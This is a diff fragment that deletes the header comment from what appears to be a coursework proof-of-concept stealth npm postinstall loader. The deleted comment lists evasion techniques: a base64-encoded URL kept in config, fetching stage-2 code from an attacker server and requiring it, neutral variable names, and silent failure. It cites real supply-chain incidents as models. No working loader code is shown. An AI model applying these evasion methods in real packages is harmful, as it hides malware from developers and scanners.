@@ -1,19 +1,3 @@
-/**
- * [PoC - NT230] Stealth postinstall — Stage 1 (Dynamic Loader)
- *
- * Kỹ thuật evasion:
- *   1. Đọc config từ JSON file (không hardcode URL → không match string pattern)
- *   2. URL được base64 encode → IOC-1 không thấy "http" hay IP
- *   3. Fetch stage 2 code từ attacker server → write ra file rồi require()
- *   4. Tên biến trung tính: "cdn", "telemetry", "analytics" — không gợi ý malicious
- *   5. Fail-silent: nếu fetch fail thì im lặng, build không bị ảnh hưởng
- *
- * Pattern dùng trong thực tế:
- *   - event-stream (2018): flatmap-stream → decrypt payload từ file khác
- *   - ua-parser-js (2021): preinstall fetch binary từ CDN
- *   - node-ipc (2022): require file riêng biệt
- */
-
 "use strict";
 
 const fs = require("fs");
